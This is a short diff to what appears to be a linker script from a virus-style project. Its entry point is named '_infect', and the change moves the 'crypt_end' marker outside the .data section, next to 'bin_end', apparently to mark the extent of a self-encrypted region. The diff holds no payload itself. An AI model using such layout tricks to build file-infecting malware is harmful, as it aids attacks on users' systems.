@@ -14,7 +14,7 @@ ENTRY(_infect)
 	}
 	.data : {
 		*(.data)
-		crypt_end = .;
 	}
+	crypt_end = .;
 	bin_end = .;
 }
